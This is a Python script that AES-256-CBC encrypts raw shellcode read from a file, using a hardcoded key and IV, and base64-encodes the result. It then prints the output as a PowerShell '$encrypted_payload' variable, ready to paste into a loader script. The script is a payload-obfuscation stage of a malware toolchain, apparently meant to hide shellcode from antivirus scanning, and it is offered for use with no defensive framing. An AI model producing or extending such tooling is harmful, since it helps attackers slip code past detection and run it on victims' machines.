from Crypto.Cipher import AES
import base64

# ========================
# AES-256 CONFIGURATION
# ========================
KEY = bytes([
    0xbe, 0x18, 0xfd, 0xe4, 0xaf, 0x91, 0x18, 0x71,
    0xcc, 0x26, 0xde, 0x78, 0x96, 0x7f, 0x9e, 0x8d,
    0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xaa,
    0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x11, 0x22, 0x33
])  # 32 bytes (AES-256)

IV = bytes([
    0x30, 0x84, 0x61, 0x75, 0x58, 0x11, 0x4e, 0x0e,
    0xab, 0xa5, 0x65, 0x42, 0x2c, 0xf0, 0x4c, 0x18
])  # 16 bytes (AES block size)

# ========================
# READ SHELLCODE AND APPLY PADDING
# ========================
with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

# Apply PKCS7 Padding
pad_length = 16 - (len(shellcode) % 16)
shellcode += bytes([pad_length] * pad_length)

# ========================
# AES-256 CBC ENCRYPTION
# ========================
cipher = AES.new(KEY, AES.MODE_CBC, IV)
encrypted_shellcode = cipher.encrypt(shellcode)

# Convert to Base64 and display in console
encrypted_b64 = base64.b64encode(encrypted_shellcode).decode()

# ========================
# OUTPUT FOR THE POWERSHELL SCRIPT
# ========================
print("\n[+] Shellcode encrypted in Base64 (copy this into your PowerShell script):\n")
print("$encrypted_payload = @'\n" + encrypted_b64 + "\n'@")

# Save to file (optional)
with open("encrypted_shellcode.txt", "w") as f:
    f.write(encrypted_b64)

print("\n[+] Encrypted shellcode saved in encrypted_shellcode.txt")
